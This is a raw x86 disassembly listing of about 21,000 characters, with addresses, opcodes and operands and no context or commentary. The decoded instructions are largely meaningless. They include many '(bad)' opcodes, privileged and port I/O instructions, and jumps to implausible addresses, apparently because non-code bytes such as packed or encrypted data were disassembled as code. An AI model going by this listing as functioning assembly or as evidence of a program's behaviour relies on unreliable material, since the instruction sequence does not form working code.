  42ca34:	xor    eax,0xc2e595a4
  42ca39:	mov    ebx,0xfac2494c
  42ca3e:	ins    DWORD PTR es:[edi],dx
  42ca3f:	dec    esi
  42ca40:	mov    edi,cs
  42ca42:	push   ebp
  42ca43:	rol    BYTE PTR [eax-0x18],1
  42ca46:	test   al,0xf3
  42ca48:	lds    esi,FWORD PTR [edi+0x40374e41]
  42ca4e:	mov    ecx,0x3bd28830
  42ca53:	lahf   
  42ca54:	rcr    BYTE PTR [edi],0xc8
  42ca57:	jbe    0x42ca71
  42ca59:	or     BYTE PTR [esi+0x1],0xce
  42ca5d:	ins    BYTE PTR es:[edi],dx
  42ca5e:	ror    ah,0x1
  42ca61:	sar    BYTE PTR [esi+0xe742f31],0x4d
  42ca68:	adc    eax,0x9b692c01
  42ca6d:	sub    DWORD PTR [ecx],0x9394b88e
  42ca73:	stc    
  42ca74:	int    0x8c
  42ca76:	add    ah,BYTE PTR [eax-0x31]
  42ca79:	(bad)  
  42ca7a:	outs   dx,DWORD PTR ds:[esi]
  42ca7b:	loope  0x42ca76
  42ca7d:	inc    ebx
  42ca7e:	dec    edi
  42ca7f:	mov    eax,ds:0xb3d1905a
  42ca84:	mov    ecx,0x37a1d50e
  42ca89:	shl    DWORD PTR [esi-0x5],1
  42ca8c:	es xchg esp,eax
  42ca8e:	mov    dl,0xa
  42ca90:	mov    esp,0x9b641df5
  42ca95:	cmp    eax,0xa23d3a27
  42ca9a:	lds    edi,FWORD PTR [ecx+edx*1+0x4b]
  42ca9e:	and    DWORD PTR [edi],ebx
  42caa0:	add    cl,ch
  42caa2:	outs   dx,DWORD PTR ds:[esi]
  42caa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caa4:	inc    ebp
  42caa5:	mov    edx,fs
  42caa7:	call   0xe2a61a43
  42caac:	js     0x42caca
  42caae:	stos   DWORD PTR es:[edi],eax
  42caaf:	outs   dx,DWORD PTR ds:[esi]
  42cab0:	push   cs
  42cab1:	inc    ebx
  42cab2:	dec    esi
  42cab3:	push   ss
  42cab4:	jo     0x42cab2
  42cab6:	jl     0x42cabe
  42cab8:	shl    DWORD PTR [edi+ebp*4+0x64],cl
  42cabc:	leave  
  42cabd:	idiv   BYTE PTR [ecx-0x5]
  42cac0:	cmc    
  42cac1:	inc    ecx
  42cac2:	cwde   
  42cac3:	push   edx
  42cac4:	or     DWORD PTR [eax+0x4a],ebx
  42cac7:	adc    eax,0xf07c948c
  42cacc:	cmp    ebx,ecx
  42cace:	js     0x42cace
  42cad0:	dec    esp
  42cad1:	push   ds
  42cad2:	shrd   DWORD PTR [ecx],esp,cl
  42cad5:	and    eax,esp
  42cad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cad8:	dec    ebp
  42cad9:	xor    BYTE PTR [ebp+eax*2-0x32cbd225],bl
  42cae0:	shl    edi,cl
  42cae2:	sub    BYTE PTR [edi+0x3],0x3f
  42cae6:	mov    al,ds:0x83bc17d9
  42caeb:	or     eax,0x7a44a234
  42caf0:	jns    0x42cab5
  42caf2:	xor    ebp,esp
  42caf4:	popa   
  42caf5:	sub    ch,BYTE PTR [eax+edi*1+0xbff874]
  42cafc:	cmp    eax,0x124d0b8e
  42cb01:	xor    ch,BYTE PTR [ebp+0x15]
  42cb04:	xor    edi,esi
  42cb06:	adc    al,0xa0
  42cb08:	inc    ebx
  42cb09:	data16 data16 shl BYTE PTR [ecx+0x12],1
  42cb0e:	dec    eax
  42cb0f:	dec    esi
  42cb10:	jbe    0x42caf3
  42cb12:	dec    edx
  42cb13:	cmp    BYTE PTR [ecx-0x25],ah
  42cb16:	(bad)  
  42cb17:	imul   ebp,edi,0x1779210b
  42cb1d:	popf   
  42cb1e:	lock push esi
  42cb20:	loope  0x42cb0a
  42cb22:	fidiv  DWORD PTR [ebp+0x7dcff613]
  42cb28:	add    ebp,edx
  42cb2a:	ss (bad) 
  42cb2d:	fdivr  DWORD PTR [eax]
  42cb2f:	es jle 0x42cb26
  42cb32:	push   gs
  42cb34:	ds cmp al,0x4
  42cb37:	xor    bl,BYTE PTR [ebp+0x57]
  42cb3a:	mov    dl,0x9
  42cb3c:	stc    
  42cb3d:	pop    edi
  42cb3e:	std    
  42cb3f:	push   0x17
  42cb41:	cs ja  0x42caf8
  42cb44:	(bad)  
  42cb45:	aad    0x7b
  42cb47:	mul    BYTE PTR [eax]
  42cb49:	mov    eax,0xea7806e5
  42cb4e:	xlat   BYTE PTR ds:[ebx]
  42cb4f:	and    esi,DWORD PTR [ebp-0x10]
  42cb52:	push   ebx
  42cb53:	sbb    bh,bh
  42cb55:	shl    BYTE PTR [ecx+0x5c],1
  42cb58:	hlt    
  42cb59:	dec    eax
  42cb5a:	mov    al,0x87
  42cb5c:	mov    esp,0xb8c8b498
  42cb61:	cmc    
  42cb62:	arpl   WORD PTR [ecx+eiz*2+0x259167b6],si
  42cb69:	in     al,dx
  42cb6a:	cmp    al,0xaa
  42cb6c:	pop    ebp
  42cb6d:	inc    ebx
  42cb6e:	cld    
  42cb6f:	in     al,0x6
  42cb71:	mov    al,ds:0x866a004c
  42cb76:	sahf   
  42cb77:	cli    
  42cb78:	retf   
  42cb79:	mov    dh,0xf8
  42cb7b:	sbb    al,0x74
  42cb7d:	lahf   
  42cb7e:	pop    es
  42cb7f:	pop    ds
  42cb80:	clwb   BYTE PTR [esi+0x4]
  42cb85:	jb     0x42cbcd
  42cb87:	and    bh,dh
  42cb89:	pop    es
  42cb8a:	or     BYTE PTR [eax+0x4f],al
  42cb8d:	mov    eax,ds:0x5807f66
  42cb92:	push   edi
  42cb93:	adc    ecx,DWORD PTR [ecx+0x30]
  42cb96:	sub    al,0x66
  42cb98:	cwde   
  42cb99:	in     al,dx
  42cb9a:	aad    0x9e
  42cb9c:	xchg   DWORD PTR [ebp-0x751cccdf],esi
  42cba2:	jnp    0x42cbac
  42cba4:	repnz aad 0x7
  42cba7:	push   edi
  42cba8:	das    
  42cba9:	jg     0x42cc0c
  42cbab:	push   DWORD PTR [esi+0xf]
  42cbae:	outs   dx,BYTE PTR ds:[esi]
  42cbaf:	clc    
  42cbb0:	jne    0x42cbc8
  42cbb2:	je     0x42cc2a
  42cbb4:	icebp  
  42cbb5:	sti    
  42cbb6:	mov    ch,0x76
  42cbb8:	fcom   QWORD PTR [ebp-0x258aa2d7]
  42cbbe:	cli    
  42cbbf:	repnz inc ecx
  42cbc1:	hlt    
  42cbc2:	test   BYTE PTR ds:0xa2c32bda,al
  42cbc8:	cwde   
  42cbc9:	xchg   ecx,eax
  42cbca:	xchg   edi,eax
  42cbcb:	ins    BYTE PTR es:[edi],dx
  42cbcc:	sub    ah,dl
  42cbce:	stos   BYTE PTR es:[edi],al
  42cbcf:	lock cdq 
  42cbd1:	inc    ebp
  42cbd2:	mov    ecx,0xb41ed2f
  42cbd7:	and    DWORD PTR [esi],esp
  42cbd9:	xchg   DWORD PTR ds:0x3b1e4ae6,ecx
  42cbdf:	imul   eax,edx,0x2d13a0a5
  42cbe5:	int    0x4e
  42cbe7:	cwde   
  42cbe8:	pop    ebx
  42cbe9:	sub    al,0xd8
  42cbeb:	hlt    
  42cbec:	lahf   
  42cbed:	daa    
  42cbee:	aad    0x81
  42cbf0:	sbb    al,0x2b
  42cbf2:	fidiv  DWORD PTR [ecx+0x7e]
  42cbf5:	imul   edi,DWORD PTR [ecx+0x2f188247],0xd9714833
  42cbff:	jae    0x42cc1b
  42cc01:	jp     0x42cb92
  42cc03:	inc    esp
  42cc04:	push   ds
  42cc05:	and    esp,DWORD PTR [edi]
  42cc07:	div    DWORD PTR [eax+0x36]
  42cc0a:	sub    BYTE PTR [edi-0x397e9ce7],dh
  42cc10:	imul   esp,edi,0xffffffd7
  42cc13:	scas   al,BYTE PTR es:[edi]
  42cc14:	leave  
  42cc15:	sbb    BYTE PTR [edi+0x1ec43f89],0x10
  42cc1c:	inc    ebx
  42cc1d:	fdiv   QWORD PTR [edx-0x10]
  42cc20:	sub    eax,0xa22ccf28
  42cc25:	clc    
  42cc26:	repnz add al,0x24
  42cc29:	adc    ah,BYTE PTR [ebx+eiz*2-0x69]
  42cc2d:	stos   DWORD PTR es:[edi],eax
  42cc2e:	cwde   
  42cc2f:	dec    esp
  42cc30:	enter  0x9188,0x30
  42cc34:	pop    edi
  42cc35:	and    al,0xa4
  42cc37:	mov    ebx,0x8b8dcfa1
  42cc3c:	pop    ss
  42cc3d:	jae    0x42cc07
  42cc3f:	dec    cx
  42cc41:	add    al,dl
  42cc43:	ret    
  42cc44:	cmp    BYTE PTR ss:[edx-0xfcc5e68],ch
  42cc4b:	les    ebp,FWORD PTR [ebp+eax*1-0x55]
  42cc4f:	fst    QWORD PTR [edx]
  42cc51:	cli    
  42cc52:	push   0x79910f42
  42cc57:	jo     0x42cc8c
  42cc59:	mov    eax,ds:0xa0ae591a
  42cc5e:	cmp    esp,DWORD PTR [esi+0x43]
  42cc61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc62:	inc    edx
  42cc63:	mov    BYTE PTR [edx-0x50dac134],bl
  42cc69:	mov    al,ds:0x351dbd77
  42cc6e:	adc    dl,BYTE PTR [eax]
  42cc70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc71:	cs xchg esp,eax
  42cc73:	mov    cl,0xf7
  42cc75:	cmp    eax,0xbf3f0431
  42cc7a:	pop    DWORD PTR [eax+eax*1]
  42cc7d:	jge    0x42cc75
  42cc7f:	push   edi
  42cc80:	xchg   edi,eax
  42cc81:	xor    ebx,edi
  42cc83:	jmp    0x50f33d9f
  42cc88:	pop    ebx
  42cc89:	test   eax,0xced19d92
  42cc8e:	add    al,0xb3
  42cc90:	data16 jae 0x42cc35
  42cc93:	xchg   esi,eax
  42cc94:	pop    ebp
  42cc95:	push   ebx
  42cc96:	sbb    bl,BYTE PTR [ebp+ecx*1+0x2e0266a9]
  42cc9d:	inc    edx
  42cc9e:	das    
  42cc9f:	jnp    0x42cc85
  42cca1:	xchg   esi,eax
  42cca2:	fldlg2 
  42cca4:	aam    0x12
  42cca6:	xchg   DWORD PTR [edi+0x10b3ddb],ebx
  42ccac:	jo     0x42cc81
  42ccae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccaf:	out    0x91,eax
  42ccb1:	lods   al,BYTE PTR ds:[esi]
  42ccb2:	cmp    al,0x8d
  42ccb4:	test   eax,0x6d88b333
  42ccb9:	mov    cl,al
  42ccbb:	push   0x1e
  42ccbd:	shr    BYTE PTR [ecx-0x2e372db9],0x40
  42ccc4:	bound  ebx,QWORD PTR [ebx-0x6c99477d]
  42ccca:	and    bh,0x7f
  42cccd:	jns    0x42ccd4
  42cccf:	aaa    
  42ccd0:	jge    0x42cc7f
  42ccd2:	sahf   
  42ccd3:	ins    BYTE PTR es:[edi],dx
  42ccd4:	fwait
  42ccd5:	add    BYTE PTR [edx-0x5c2df0db],ch
  42ccdb:	outs   dx,BYTE PTR ds:[esi]
  42ccdc:	sbb    al,0xfe
  42ccde:	jmp    0xda04:0x35039920
  42cce5:	and    eax,0x19051528
  42ccea:	inc    edx
  42cceb:	or     al,0xaf
  42cced:	pop    esp
  42ccee:	dec    ecx
  42ccef:	mov    ds:0x87416029,al
  42ccf4:	dec    ebx
  42ccf5:	inc    edx
  42ccf6:	punpckhwd mm0,QWORD PTR [ebp+0x53]
  42ccfa:	stos   BYTE PTR es:[edi],al
  42ccfb:	mov    BYTE PTR [ebx+0x23],cl
  42ccfe:	dec    ebx
  42ccff:	lock daa 
  42cd01:	(bad)  
  42cd02:	lock xchg DWORD PTR [ecx],ebp
  42cd05:	pop    ss
  42cd06:	out    dx,al
  42cd07:	fstp   st(5)
  42cd09:	sbb    BYTE PTR [esi-0x406ef058],0x6d
  42cd10:	inc    ebx
  42cd11:	enter  0xe246,0xe8
  42cd15:	and    edi,DWORD PTR [edi]
  42cd17:	rol    ebp,0xe7
  42cd1a:	imul   eax,DWORD PTR [ecx-0x18],0x22b4e281
  42cd21:	std    
  42cd22:	mov    ah,0x4a
  42cd24:	push   edx
  42cd25:	jb     0x42cd00
  42cd27:	jbe    0x42cd8c
  42cd29:	jle    0x42cd2b
  42cd2b:	idiv   BYTE PTR [edx+0x72]
  42cd2e:	test   DWORD PTR [eax],esp
  42cd30:	xlat   BYTE PTR ds:[ebx]
  42cd31:	xor    BYTE PTR [ebx+0x1010e306],0x67
  42cd38:	div    DWORD PTR [ecx+0x72]
  42cd3b:	add    al,0xb
  42cd3d:	or     ebp,DWORD PTR [edi]
  42cd3f:	hlt    
  42cd40:	cmp    BYTE PTR [eax],dh
  42cd42:	ret    
  42cd43:	arpl   WORD PTR [esi-0x5e9d0303],ax
  42cd49:	enter  0x703c,0x1f
  42cd4d:	mov    dl,0x2e
  42cd4f:	aaa    
  42cd50:	mov    esi,0x8c3fbe70
  42cd55:	repnz sbb edi,0x44
  42cd59:	and    DWORD PTR [ebp+0x4ef37982],edx
  42cd5f:	and    al,0xe7
  42cd61:	into   
  42cd62:	pusha  
  42cd63:	cli    
  42cd64:	stos   DWORD PTR es:[edi],eax
  42cd65:	pop    ds
  42cd66:	xor    BYTE PTR [edx-0x20f7ea1],0xb0
  42cd6d:	push   ebx
  42cd6e:	outs   dx,BYTE PTR ds:[esi]
  42cd6f:	and    eax,0x612c2137
  42cd74:	scas   al,BYTE PTR es:[edi]
  42cd75:	mov    ebp,0xfd5fed05
  42cd7a:	xor    dl,ch
  42cd7c:	push   esi
  42cd7d:	outs   dx,DWORD PTR ds:[esi]
  42cd7e:	xchg   BYTE PTR [ebx],ch
  42cd80:	rol    BYTE PTR [edx-0x73813b2e],1
  42cd86:	cld    
  42cd87:	(bad)  
  42cd88:	pshufw mm6,QWORD PTR [ecx+0x42],0x46
  42cd8d:	xor    eax,0xbfdac35a
  42cd92:	mov    ah,BYTE PTR [eax-0xb]
  42cd95:	out    dx,al
  42cd96:	retf   
  42cd97:	clc    
  42cd98:	xchg   ecx,eax
  42cd99:	lods   eax,DWORD PTR ds:[esi]
  42cd9a:	mov    dl,0x52
  42cd9c:	mov    esi,DWORD PTR [eax]
  42cd9e:	push   es
  42cd9f:	mov    ebp,0xf8b38fe2
  42cda4:	mov    dl,0xd0
  42cda6:	dec    ebx
  42cda7:	pop    esp
  42cda8:	cmp    esi,esi
  42cdaa:	pop    edi
  42cdab:	sbb    BYTE PTR [esi],0xbd
  42cdae:	loopne 0x42cd8e
  42cdb0:	ja     0x42cd7e
  42cdb2:	jge    0x42cd74
  42cdb4:	loope  0x42cde6
  42cdb6:	into   
  42cdb7:	pushf  
  42cdb8:	in     al,0xf6
  42cdba:	fld    DWORD PTR [ecx]
  42cdbc:	in     eax,dx
  42cdbd:	jae    0x42ce3b
  42cdbf:	fadd   DWORD PTR [ebx-0x48]
  42cdc2:	mov    edx,0x8bfb2869
  42cdc7:	fcom   DWORD PTR [ecx-0x68]
  42cdca:	sar    BYTE PTR [esi+0x62962c63],1
  42cdd0:	xchg   ebx,eax
  42cdd1:	test   al,0x5e
  42cdd3:	(bad)  [ebx]
  42cdd5:	out    dx,eax
  42cdd6:	or     eax,0xc5ad0619
  42cddb:	pop    ecx
  42cddc:	inc    ebp
  42cddd:	call   0x18955b2b
  42cde2:	xor    cl,ch
  42cde4:	mov    edi,0x7450db38
  42cde9:	cmp    BYTE PTR [ecx+0x2ce3cc94],dh
  42cdef:	sar    DWORD PTR [edi-0x71],0x3b
  42cdf3:	mov    BYTE PTR [eax-0x654cb760],cl
  42cdf9:	xor    BYTE PTR [eax+edi*4+0x1faf3a84],bh
  42ce00:	in     eax,0xd4
  42ce02:	sbb    al,0x62
  42ce04:	and    al,0x20
  42ce06:	out    dx,eax
  42ce07:	pop    eax
  42ce08:	sbb    eax,0xf4616e14
  42ce0d:	pop    ebp
  42ce0e:	dec    ebx
  42ce0f:	jae    0x42ce5f
  42ce11:	or     ah,BYTE PTR [edi-0x19]
  42ce14:	cmovg  esp,ecx
  42ce17:	inc    esp
  42ce18:	inc    edi
  42ce19:	add    esp,DWORD PTR [esi-0x71]
  42ce1c:	int    0xac
  42ce1e:	cmp    cl,al
  42ce20:	push   edx
  42ce21:	ror    bl,1
  42ce23:	sub    DWORD PTR [edi+0x79987b68],0xf13d0023
  42ce2d:	(bad)  
  42ce2e:	lods   al,BYTE PTR ds:[esi]
  42ce2f:	lea    ecx,[ebx-0x4272e3d5]
  42ce35:	or     DWORD PTR [ecx+0x369b53cd],esp
  42ce3b:	push   esi
  42ce3c:	scas   al,BYTE PTR es:[edi]
  42ce3d:	add    DWORD PTR [ecx-0x2f],ebp
  42ce40:	xchg   dl,dl
  42ce42:	scas   al,BYTE PTR es:[edi]
  42ce43:	mov    ebp,0xc089ec36
  42ce48:	icebp  
  42ce49:	out    dx,al
  42ce4a:	dec    esi
  42ce4b:	clc    
  42ce4c:	mov    edx,0x129b30ec
  42ce51:	cwde   
  42ce52:	(bad)  
  42ce53:	fistp  QWORD PTR [esi+ecx*8]
  42ce56:	mov    ebp,0x91464251
  42ce5b:	rcl    ecx,1
  42ce5d:	jmp    0xe2ea6a25
  42ce62:	mov    BYTE PTR [esp+eax*4+0x4f],al
  42ce66:	adc    esi,0x5d
  42ce69:	test   BYTE PTR [esi+0x6d],bh
  42ce6c:	or     bh,BYTE PTR [edx]
  42ce6e:	enter  0x3fce,0x36
  42ce72:	push   ebp
  42ce73:	(bad)  
  42ce74:	jmp    0x36e5013e
  42ce79:	or     ebp,ebp
  42ce7b:	and    al,0x4
  42ce7d:	les    ecx,FWORD PTR cs:[ebx+0x23b616d8]
  42ce84:	inc    edx
  42ce85:	ret    0x5441
  42ce88:	rol    DWORD PTR [esi-0x2c33aa64],1
  42ce8e:	lea    edi,[ebx]
  42ce90:	fimul  DWORD PTR [eax]
  42ce92:	cli    
  42ce93:	xchg   ebx,eax
  42ce94:	push   eax
  42ce95:	pushf  
  42ce96:	lahf   
  42ce97:	lods   eax,DWORD PTR ds:[esi]
  42ce98:	rcl    edi,0x69
  42ce9b:	ret    
  42ce9c:	call   0x7def:0xad82ee7f
  42cea3:	nop
  42cea4:	jae    0x42ced9
  42cea6:	push   eax
  42cea7:	(bad)  
  42cea8:	stc    
  42cea9:	pop    ecx
  42ceaa:	pop    esp
  42ceab:	stc    
  42ceac:	into   
  42cead:	dec    ecx
  42ceae:	sbb    al,0x22
  42ceb0:	xor    al,0x21
  42ceb2:	nop
  42ceb3:	and    DWORD PTR [edi-0x32],esi
  42ceb6:	inc    sp
  42ceb8:	pushf  
  42ceb9:	rol    dh,1
  42cebb:	ror    esi,0x4f
  42cebe:	arpl   WORD PTR [edi+0x68],sp
  42cec1:	push   ebp
  42cec2:	add    BYTE PTR [eax],al
  42cec4:	mov    edx,0xe21c89d
  42cec9:	out    0x6d,al
  42cecb:	out    0x2e,eax
  42cecd:	daa    
  42cece:	cmp    al,0xd0
  42ced0:	cmp    eax,0x81c7bff3
  42ced5:	xchg   DWORD PTR [edi+0x30ceba8a],edi
  42cedb:	and    al,0xbb
  42cedd:	or     eax,0xe71558d1
  42cee2:	pop    ds
  42cee3:	pop    ds
  42cee4:	add    BYTE PTR [ecx-0x58421702],bl
  42ceea:	or     DWORD PTR [esi+0x4b],esp
  42ceed:	add    eax,0x1a34c295
  42cef2:	enter  0x1946,0x3d
  42cef6:	xchg   esp,eax
  42cef7:	inc    edx
  42cef8:	je     0x42cf5d
  42cefa:	adc    al,0xfe
  42cefc:	sbb    BYTE PTR [edi],0xcf
  42ceff:	jg     0x42cea2
  42cf01:	pop    ds
  42cf02:	stc    
  42cf03:	xchg   edx,eax
  42cf04:	sbb    ebp,DWORD PTR [ebp-0x43]
  42cf07:	ds pop eax
  42cf09:	in     eax,dx
  42cf0a:	jbe    0x42cf81
  42cf0c:	xor    BYTE PTR [ebx],al
  42cf0e:	outs   dx,DWORD PTR ds:[esi]
  42cf0f:	into   
  42cf10:	popa   
  42cf11:	jecxz  0x42ceed
  42cf13:	and    cl,BYTE PTR [esi-0x217fcac1]
  42cf19:	lods   eax,DWORD PTR ds:[esi]
  42cf1a:	or     eax,0x3038e364
  42cf1f:	xor    eax,0x87d78933
  42cf24:	or     dh,ch
  42cf26:	cwde   
  42cf27:	sbb    eax,0x6b7dccf8
  42cf2c:	loope  0x42cf3b
  42cf2e:	dec    eax
  42cf2f:	mov    al,0xac
  42cf31:	cmc    
  42cf32:	shl    dl,0x5c
  42cf35:	or     esi,0xffffff83
  42cf38:	(bad)  
  42cf39:	loopne 0x42cf07
  42cf3b:	ret    
  42cf3c:	sar    BYTE PTR [ecx+0x3a],0x9
  42cf40:	push   ss
  42cf41:	jp     0x42cf13
  42cf43:	add    eax,0xdd22bd5a
  42cf48:	ja     0x42cfb9
  42cf4a:	push   esi
  42cf4b:	wbinvd 
  42cf4d:	sbb    bl,BYTE PTR [ecx]
  42cf4f:	push   eax
  42cf50:	or     edx,eax
  42cf52:	imul   edx,DWORD PTR [eax+0x27bab84a],0x8e7a1d9e
  42cf5c:	xor    al,0x67
  42cf5e:	cld    
  42cf5f:	jno    0x42cf42
  42cf61:	or     edi,DWORD PTR [ebx-0x32]
  42cf64:	and    edx,eax
  42cf66:	in     eax,dx
  42cf67:	es push ss
  42cf69:	mov    WORD PTR [edx],?
  42cf6b:	je     0x42cfeb
  42cf6d:	inc    esp
  42cf6e:	cmp    DWORD PTR es:[eax+edx*8+0x46],0x12fe8ada
  42cf77:	std    
  42cf78:	lahf   
  42cf79:	mov    ebp,0x197d7790
  42cf7e:	leave  
  42cf7f:	(bad)  
  42cf80:	jle    0x42cf04
  42cf82:	mov    bl,bl
  42cf84:	push   cs
  42cf85:	retf   
  42cf86:	(bad)  
  42cf87:	jge    0x42cf39
  42cf89:	fisub  DWORD PTR [edx+0x5be8f818]
  42cf8f:	push   ecx
  42cf90:	jnp    0x42cffb
  42cf92:	jno    0x42cff9
  42cf94:	arpl   WORD PTR [ecx],si
  42cf96:	adc    ecx,DWORD PTR [edi+0x1da370ea]
  42cf9c:	adc    eax,0xfe428cee
  42cfa1:	aam    0x43
  42cfa3:	call   0x665a8b84
  42cfa8:	sub    esp,DWORD PTR [ecx-0x671c6d6]
  42cfae:	fistp  QWORD PTR [ebp+0x11]
  42cfb1:	xchg   ebp,eax
  42cfb2:	scas   al,BYTE PTR es:[edi]
  42cfb3:	and    ah,BYTE PTR [edx+0x3b]
  42cfb6:	ds or  ebx,ebp
  42cfb9:	iret   
  42cfba:	aas    
  42cfbb:	mov    DWORD PTR [edi+0x7e],ecx
  42cfbe:	inc    edx
  42cfbf:	(bad)  
  42cfc0:	pop    edx
  42cfc1:	ins    DWORD PTR es:[edi],dx
  42cfc2:	shl    DWORD PTR [ecx-0x74],cl
  42cfc5:	aaa    
  42cfc6:	mov    ebp,DWORD PTR [ebx-0x164600c7]
  42cfcc:	add    ebx,DWORD PTR [edi]
  42cfce:	pop    edx
  42cfcf:	xchg   esi,eax
  42cfd0:	test   BYTE PTR [edx-0x17b6530a],0x25
  42cfd7:	shr    ah,0xf1
  42cfda:	lea    ebp,[bx-0x1c]
  42cfde:	lds    esp,FWORD PTR [ebx+0x3e]
  42cfe1:	add    al,0x2e
  42cfe3:	adc    esp,esi
  42cfe5:	xchg   edx,eax
  42cfe6:	pusha  
  42cfe7:	mov    dh,0x1d
  42cfe9:	fstp   DWORD PTR [ebx+0x3259e2c]
  42cfef:	cmp    eax,0x2eb801f
  42cff4:	jmp    0xb413:0x769267a0
  42cffb:	std    
  42cffc:	stos   DWORD PTR es:[edi],eax
  42cffd:	shl    BYTE PTR [edx+0x4e],1
  42d000:	popf   
  42d001:	ret    0x67dd
  42d004:	jmp    0xf2abf7ab
  42d009:	mov    bh,0x46
  42d00b:	mov    al,0xe2
  42d00d:	xchg   ebp,eax
  42d00e:	pushf  
  42d00f:	enter  0xd43a,0xbc
  42d013:	mov    bl,dh
  42d015:	(bad)  ds:0x82512a78
  42d01b:	bound  esi,QWORD PTR [edi+0x23]
  42d01e:	dec    ebp
  42d01f:	xor    BYTE PTR [ecx-0x4c],bl
  42d022:	xchg   edx,eax
  42d023:	mov    ebx,ecx
  42d025:	sub    al,0x58
  42d027:	sub    BYTE PTR [esi-0x70],dl
  42d02a:	sub    dl,BYTE PTR [edi-0x4e5a52f0]
  42d030:	xor    edx,esp
  42d032:	(bad)  
  42d033:	fimul  DWORD PTR [esi]
  42d035:	aaa    
  42d036:	retf   0x1992
  42d039:	aaa    
  42d03a:	mov    esi,0x830b0eaf
  42d03f:	inc    ebp
  42d040:	ins    BYTE PTR es:[edi],dx
  42d041:	(bad)  
  42d042:	(bad)  
  42d043:	fwait
  42d044:	cmp    BYTE PTR [edx],bh
  42d046:	mov    bl,0x6c
  42d048:	sbb    dh,BYTE PTR [ecx+0x7a]
  42d04b:	je     0x42d05f
  42d04d:	jp     0x42d070
  42d04f:	or     al,0xb
  42d051:	cmp    eax,DWORD PTR [esi-0x6ad19303]
  42d057:	mov    ch,0x3
  42d059:	ret    0x8f08
  42d05c:	mov    ch,0xbf
  42d05e:	mov    cl,0x65
  42d060:	pop    eax
  42d061:	leave  
  42d062:	mov    al,0xf6
  42d064:	int3   
  42d065:	xchg   edx,eax
  42d066:	mov    ch,0xa
  42d068:	push   es
  42d069:	out    dx,eax
  42d06a:	aas    
  42d06b:	mov    ebp,0x770ff56
  42d070:	es mov edi,0xffd58c3b
  42d076:	fiadd  DWORD PTR [esi]
  42d078:	sti    
  42d079:	pop    edx
  42d07a:	sub    ebp,DWORD PTR [edx-0x1b1d4f7]
  42d080:	retf   
  42d081:	sbb    BYTE PTR [edx+0x69],dl
  42d084:	sbb    ebp,ecx
  42d086:	lods   eax,DWORD PTR ds:[esi]
  42d087:	push   cs
  42d088:	sar    ah,cl
  42d08a:	pop    ecx
  42d08b:	xor    al,0x13
  42d08d:	pop    edx
  42d08e:	pop    ecx
  42d08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d090:	dec    ebp
  42d091:	jmp    0x42d106
  42d093:	dec    eax
  42d094:	push   0xffffffaa
  42d096:	mov    dl,0xa0
  42d098:	cmp    DWORD PTR [edi+0x4f8adea9],0x1d
  42d09f:	pop    edx
  42d0a0:	push   edx
  42d0a1:	stos   DWORD PTR es:[edi],eax
  42d0a2:	sbb    ebp,ebx
  42d0a4:	lods   eax,DWORD PTR ds:[esi]
  42d0a5:	or     dh,dl
  42d0a7:	jns    0x42d0c2
  42d0a9:	fwait
  42d0aa:	mov    esp,0x9a34f416
  42d0af:	and    BYTE PTR [ecx-0x79b28f10],cl
  42d0b5:	call   0x9ab636b8
  42d0ba:	loopne 0x42d0e1
  42d0bc:	xchg   ebx,eax
  42d0bd:	pusha  
  42d0be:	push   si
  42d0c0:	inc    esi
  42d0c1:	test   DWORD PTR [edi-0x5444573e],0x66c0e60b
  42d0cb:	jp     0x42d105
  42d0cd:	or     ecx,DWORD PTR [edx+0x57863cf7]
  42d0d3:	push   cs
  42d0d4:	psrad  mm6,QWORD PTR [edx-0x6cf1734e]
  42d0db:	ror    BYTE PTR [ebx],1
  42d0dd:	ret    
  42d0de:	cmp    BYTE PTR [ecx],al
  42d0e0:	dec    eax
  42d0e1:	rcr    dh,cl
  42d0e3:	out    0x3e,eax
  42d0e5:	andnps xmm5,XMMWORD PTR [ebp-0x71]
  42d0e9:	dec    eax
  42d0ea:	mov    ah,0x6
  42d0ec:	or     al,bl
  42d0ee:	add    DWORD PTR [esi],ebp
  42d0f0:	lahf   
  42d0f1:	jne    0x42d15d
  42d0f3:	mov    esp,edi
  42d0f5:	test   DWORD PTR [esi-0x19],ebp
  42d0f8:	hlt    
  42d0f9:	push   0x45d5bdaf
  42d0fe:	and    al,0x47
  42d100:	mov    edi,0x164cf484
  42d105:	dec    ebx
  42d106:	ret    
  42d107:	dec    ecx
  42d108:	cwde   
  42d109:	stos   DWORD PTR es:[edi],eax
  42d10a:	xor    ebx,DWORD PTR [eax+0x3956933b]
  42d110:	out    dx,al
  42d111:	jl     0x42d187
  42d113:	xchg   edx,eax
  42d114:	in     al,dx
  42d115:	lea    esp,ds:0xc5edaeb4
  42d11b:	ror    cl,1
  42d11d:	xor    DWORD PTR [eax-0x4d7dd97d],edi
  42d123:	lods   al,BYTE PTR es:[esi]
  42d125:	mov    edx,0x1ffe84d7
  42d12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d12b:	jo     0x42d127
  42d12d:	xor    eax,0x17b26c13
  42d132:	(bad)  
  42d133:	adc    BYTE PTR ds:0x431b9d60,cl
  42d139:	scas   eax,DWORD PTR es:[edi]
  42d13a:	dec    ebp
  42d13b:	and    ah,BYTE PTR [edx+0x27fec25c]
  42d141:	call   0xb7fe85a4
  42d146:	mov    bh,0x7
  42d148:	xor    BYTE PTR [eax+edx*4],bh
  42d14b:	rol    DWORD PTR [ebx*1-0x703460d8],0x9b
  42d153:	outs   dx,DWORD PTR ds:[esi]
  42d154:	pop    esi
  42d155:	cmovg  ebp,DWORD PTR ds:0x1324183
  42d15c:	mov    ds:0xeeb86d7d,al
  42d161:	ret    
  42d162:	scas   eax,DWORD PTR es:[edi]
  42d163:	ret    
  42d164:	rcl    BYTE PTR [esi-0x4d97083d],cl
  42d16a:	jmp    0xe895:0x1a111468
  42d171:	xchg   esi,eax
  42d172:	cmc    
  42d173:	jmp    0x42d0f7
  42d175:	adc    eax,0xbb139f01
  42d17a:	(bad)  
  42d17b:	shr    DWORD PTR [edx-0x607cf000],cl
  42d181:	rcl    DWORD PTR [esi],1
  42d183:	xchg   esi,eax
  42d184:	jmp    0x42d18a
  42d186:	mov    eax,0xbd0b2bba
  42d18b:	fldenv [ebx]
  42d18d:	mov    bh,0x7f
